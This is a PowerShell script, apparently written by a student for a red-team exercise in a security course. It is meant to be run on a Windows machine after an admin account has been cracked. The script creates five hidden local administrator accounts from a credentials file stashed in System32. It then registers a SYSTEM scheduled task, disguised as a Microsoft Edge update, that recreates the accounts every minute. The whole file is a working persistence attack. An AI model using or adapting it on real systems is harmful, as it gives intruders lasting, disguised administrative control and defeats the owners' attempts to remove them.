#################################################################
# Isaac Settle
# CSEC-473 - Foxtrot
# Date: 3/5/25
# Description: Once an admin account has been cracked and access has been granted to a windows box execute this script to create persistent users which replenishes every minute through task scheduler.

#credentials for red-team accounts
$credentials = Import-Clixml -Path "C:\Windows\System32\fi-Fi\credentials.xml"
$username = $credentials.username
$username2 = $credentials.username2
$username3 = $credentials.username3
$username4 = $credentials.username4
$username5 = $credentials.username5
$password = $credentials.password
$password2 = $credentials.password2
$password3 = $credentials.password3
$password4 = $credentials.password4
$password5 = $credentials.password5

#Function that creates the local admin account given paramaters provided and schedules the task to run this script every minute.
function Create-AdminUser {
    param (
        [string]$username,
        [securestring]$password
    )

    if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name $username -Password $password
        Write-Host "User '$username' created."

    } else {
        Write-Host "User 'username' already exists."
    }

    $adminGroup = Get-LocalGroup -Name "Administrators"
    if (-not ($adminGroup.Members | Where-Object {$_.Name -eq $username})) {
        Add-LocalGroupMember -Group "Administrators" -Member $username
        Write-Host "User '$username' added to Administrators group."
    } else {
        Write-Host "User '$username' is already in the Administrators group."
    }

    }

    Create-AdminUser -username $username -password $password
    Create-AdminUser -username $username2 -password $password2
    Create-AdminUser -username $username3 -password $password3
    Create-AdminUser -username $username4 -password $password4
    Create-AdminUser -username $username5 -password $password5

    # check to see if the task already exists, if not create the task.
    if (Get-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUser" -ErrorAction SilentlyContinue) {
        Write-Host "Already created"
    } else {
        #task name established to blend in
        $taskName = "MicrosoftEdgeUpdateTaskMachineUser"
        $scriptPath = $PSCommandPath
        $taskAction = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "$scriptPath"
        $taskTrigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 1) -Once -At (Get-Date)
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings

        Write-Host "Scheduled task '$taskName' created to run every minute"
    }